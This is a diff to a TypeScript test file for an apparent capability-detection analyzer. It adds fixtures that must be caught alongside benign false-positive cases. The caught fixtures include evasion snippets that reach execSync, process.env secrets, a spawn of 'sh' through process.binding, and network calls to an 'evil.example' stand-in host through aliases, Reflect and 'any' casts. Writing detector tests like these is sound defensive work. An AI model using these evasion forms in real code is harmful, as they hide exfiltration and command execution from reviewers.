@@ -88,6 +88,53 @@ const caught: Record<string, string> = {
   e03_any_env_whole: "export function t() { return Object.keys((process as any).env); }",
   e04_angle_unknown_shape: "export async function t(u: string) { return (<{ fetch(u: string): Promise<unknown> }><unknown>globalThis).fetch(u); }",
   e05_any_member_as_value: "export function t() { const f = (globalThis as any).fetch; return f; }",
+  // Found in the 0.3 review: a const alias used as a value, rather than called.
+  f01_alias_call: "import { execSync } from \"node:child_process\";\nconst run = execSync;\nexport function t() { return run.call(null, \"id\"); }",
+  f02_alias_reflect_apply: "import { execSync } from \"node:child_process\";\nconst run = execSync;\nexport function t() { return Reflect.apply(run, null, [\"id\"]); }",
+  f03_alias_map: "const get = fetch;\nexport function t(us: string[]) { return us.map(get); }",
+  f04_alias_then: "const get = fetch;\nexport function t(u: string) { return Promise.resolve(u).then(get); }",
+  f05_alias_chain: "import * as cp from \"node:child_process\";\nconst a = cp.execSync;\nconst b = a;\nexport function t() { return [\"id\"].map(b); }",
+  f06_object_member_value: "const api = { go: fetch };\nexport function t(us: string[]) { return us.map(api.go); }",
+  // Constructors reached through an alias, a subclass, a parameter, or Reflect.construct.
+  g01_ws_alias: "export function t() { const WS = WebSocket; return new WS(\"wss://evil.example/x\"); }",
+  g02_ws_param: "export function t(C: typeof WebSocket) { return new C(\"wss://evil.example/x\"); }",
+  g03_ws_subclass: "class Sock extends WebSocket {}\nexport function t() { return new Sock(\"wss://evil.example/x\"); }",
+  g04_ws_super: "class Sock extends WebSocket { constructor(u: string) { super(u); } }\nexport function t() { return new Sock(\"wss://evil.example/x\"); }",
+  g05_reflect_construct_ws: "export function t() { return Reflect.construct(WebSocket, [\"wss://evil.example/x\"]); }",
+  g06_reflect_construct_worker: "import { Worker } from \"node:worker_threads\";\nexport function t(c: string) { return Reflect.construct(Worker, [c, { eval: true }]); }",
+  g07_reflect_construct_script: "import vm from \"node:vm\";\nexport function t(c: string) { return (Reflect.construct(vm.Script, [c]) as vm.Script).runInThisContext(); }",
+  g08_eventsource_alias: "export function t() { const E = EventSource; return new E(\"https://evil.example/x\"); }",
+  // Browser network and code-loading APIs in indirect forms.
+  h01_beacon_call: "export function t(d: string) { return navigator.sendBeacon.call(navigator, \"https://evil.example/x\", d); }",
+  h02_xhr_prototype_open: "export function t() { const x = new XMLHttpRequest(); XMLHttpRequest.prototype.open.call(x, \"GET\", \"https://evil.example/x\"); x.send(); }",
+  h03_window_settimeout_string: "export function t() { window.setTimeout(\"fetch('https://evil.example/x')\", 0); }",
+  h04_dom_worker: "export function t() { return new Worker(\"https://evil.example/w.js\"); }",
+  h05_shared_worker: "export function t(u: string) { return new SharedWorker(u); }",
+  h06_webtransport: "export function t() { return new WebTransport(\"https://evil.example/x\"); }",
+  h07_settimeout_call_string: "export function t() { setTimeout.call(null, \"fetch('https://evil.example/x')\", 0); }",
+  // Capability modules reaching `any` in ways other than a namespace import (the 0.3 review).
+  i01_import_equals_cast: "import cp = require(\"child_process\");\nexport function t() { return (cp as any).exec(\"id\"); }",
+  i02_import_equals_stored: "import cp = require(\"child_process\");\nexport function t() { const m: any = cp; return m.exec(\"id\"); }",
+  i03_dynamic_import_cast: "export async function t() { const m = await import(\"node:child_process\"); return (m as any).exec(\"id\"); }",
+  i04_dynamic_import_inline: "export async function t() { return ((await import(\"node:child_process\")) as any).exec(\"id\"); }",
+  i05_barrel_cast: "import * as sys from \"./fp22_barrel.js\";\nexport function t() { return (sys as any).exec(\"id\"); }",
+  i06_object_values: "import * as cp from \"node:child_process\";\nexport function t() { for (const f of Object.values(cp)) (f as any)(\"id\"); }",
+  i07_unknown_param: "import * as cp from \"node:child_process\";\nfunction use(m: unknown) { return (m as any).exec(\"id\"); }\nexport function t() { return use(cp); }",
+  i08_then_any_param: "import * as cp from \"node:child_process\";\nexport function t() { return Promise.resolve(cp).then((m: any) => m.exec(\"id\")); }",
+  i09_globalthis_process_env: "export function t() { return (globalThis.process as any).env.SECRET; }",
+  i10_computed_read_any: "import * as fs from \"node:fs\";\nexport function t(k: keyof typeof fs, p: string) { const f: any = fs[k]; return f(p, \"x\"); }",
+  i11_computed_read_cast: "import * as fs from \"node:fs\";\nexport function t(k: keyof typeof fs, p: string) { const f = fs[k]; return (f as any)(p, \"x\"); }",
+  i12_builtin_module_cast: "export function t() { return (process.getBuiltinModule(\"node:child_process\") as any).execSync(\"id\"); }",
+  i13_process_cast_builtin_module: "export function t() { return (process as any).getBuiltinModule(\"child_process\").execSync(\"id\"); }",
+  i14_reflect_get_module: "import * as cp from \"node:child_process\";\nexport function t(k: string) { return Reflect.get(cp, k)(\"id\"); }",
+  i15_reflect_get_global: "export function t(u: string) { return Reflect.get(globalThis, \"fet\" + \"ch\")(u); }",
+  i16_process_binding: "export function t() { return (process as any).binding(\"spawn_sync\").spawn({ file: \"sh\" }); }",
+  i17_global_any_construct: "export function t(u: string) { return new (globalThis as any).WebSocket(u); }",
+  i18_global_any_chain: "export function t(u: string, d: string) { return (window as any).navigator.sendBeacon(u, d); }",
+  i19_global_any_worker: "export function t(c: string) { return new (window as any).Worker(c); }",
+  // Computed calls over objects whose members are capabilities only through an alias or the platform.
+  j01_platform_computed: "export function t(k: \"sendBeacon\" | \"javaEnabled\", u: string) { return (navigator[k] as (u: string) => unknown)(u); }",
+  j02_record_of_alias: "import { execSync } from \"node:child_process\";\nconst run = execSync;\nconst ops: Record<string, (c: string) => unknown> = { run };\nexport function t(k: string) { return ops[k]!(\"id\"); }",
 };
 
 // Harmless code that must not be reported, including common `any` casts that reach no capability.
@@ -108,6 +155,20 @@ const silent: Record<string, string> = {
   b05_any_param: "export async function t(f: any, u: string) { return f(u); }",
   fp14_window_computed_read: "export function t(k: string) { return (window as any)[k]; }",
   fp15_harmless_module_any: "import * as path from \"node:path\";\nexport function t() { const p: any = path; return p.join(\"a\", \"b\"); }",
+  // Capability functions and classes mentioned without being called or passed on.
+  fp16_instanceof: "export function t(x: unknown) { return x instanceof WebSocket; }",
+  fp17_feature_detection: "export function t() { if (globalThis.fetch && !globalThis.WebSocket) return 1; return typeof EventSource === \"undefined\" ? 2 : 3; }",
+  fp18_class_constant: "export function t() { return WebSocket.OPEN + XMLHttpRequest.DONE; }",
+  fp19_timer_callbacks: "import { promisify } from \"node:util\";\nexport const sleep = promisify(setTimeout);\nexport function t() { window.setTimeout(() => {}, 10); setTimeout.call(null, () => {}, 0); }",
+  fp20_web_classes: "export function t() { return new Headers({ a: \"b\" }).get(\"a\") ?? new URL(\"/x\", \"https://good.example\").href; }",
+  fp21_comparison: "export function t(f: unknown) { return f === fetch || f !== WebSocket; }",
+  // A barrel re-exporting a capability module touches nothing by itself (i05 casts it).
+  fp22_barrel: "export * from \"node:child_process\";",
+  fp23_enumerate_plain: "import * as path from \"node:path\";\nexport function t() { return Object.values({ a: 1 }).length + Object.keys(path).length; }",
+  fp24_pure_module_unknown: "import * as path from \"node:path\";\nfunction use(m: unknown) { return m; }\nexport function t() { return use(path); }",
+  fp25_reflect_get_reads: "export function t(k: string) { return [Reflect.get(globalThis, \"__APP__\"), Reflect.get(window, k)]; }",
+  fp26_module_constant: "import * as fs from \"node:fs\";\nexport function t() { return fs.constants.F_OK; }",
+  fp27_then_any_harmless: "export function t() { return Promise.resolve(1).then((n: any) => n + 1); }",
 };
 
 const knownMisses: Record<string, { why: string; code: string }> = {
